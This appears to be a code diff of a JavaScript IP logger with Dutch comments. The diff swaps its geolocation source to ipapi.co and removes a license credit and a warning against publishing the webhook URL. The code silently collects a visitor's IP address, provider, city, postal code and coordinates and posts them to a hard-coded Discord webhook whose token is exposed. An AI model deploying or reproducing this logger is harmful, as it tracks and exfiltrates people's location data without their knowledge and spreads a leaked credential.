@@ -2,30 +2,29 @@
 const webHookUrl = "https://discord.com/api/webhooks/1310562977971175425/DILmHb8nxmmVV0f1vfR4D2yoOcMZL-D1RevuOOSaJVndxL2InKUcQpZSFUCwGRjuwEEY";
 
 /*
-    Forked from: https://github.com/luisoos/IP-Log-To-Discord-Webhook
-    License: MIT
-    ** Let op: Deel je Webhook URL nooit in publieke code! **
+    Gebruik van ipapi.co voor IP-geolocatiegegevens.
+    Geen API-token nodig.
+    API-documentatie: https://ipapi.co/
 */
 
 const sendToWebhook = async () => {
     try {
-        // Haal gegevens op van de IP API
-        const response = await fetch('https://ip-api.com/json/');
-        if (!response.ok) throw new Error("IP-API request failed");
+        // Haal gegevens op van de ipapi.co API
+        const response = await fetch('https://ipapi.co/json/');
+        if (!response.ok) throw new Error("ipapi.co request failed");
         
         const data = await response.json();
 
         // Variabelen instellen
-        const ip = data.query;
-        const provider = `${data.org} (${data.as})`;
-        const timezone = data.timezone;
-        const country = data.country;
-        const countryCode = data.countryCode.toLowerCase();
-        const region = `${data.region} (${data.regionName})`;
-        const city = data.city;
-        const zip = data.zip;
-        const lat = data.lat;
-        const lon = data.lon;
+        const ip = data.ip;
+        const provider = data.org || "Onbekend";
+        const timezone = data.timezone || "Onbekend";
+        const country = data.country_name || "Onbekend";
+        const region = data.region || "Onbekend";
+        const city = data.city || "Onbekend";
+        const zip = data.postal || "Onbekend";
+        const lat = data.latitude || "Onbekend";
+        const lon = data.longitude || "Onbekend";
 
         // Payload voor de webhook
         const params = {
@@ -41,7 +40,7 @@ ${provider}
 __**🗺️ Timezone:**__ 
 ${timezone}
 
-__**:flag_${countryCode}: Country and Region:**__ 
+__**🌍 Country and Region:**__ 
 ${country} - ${region}
 
 __**🏙️ Zip Code & City:**__ 
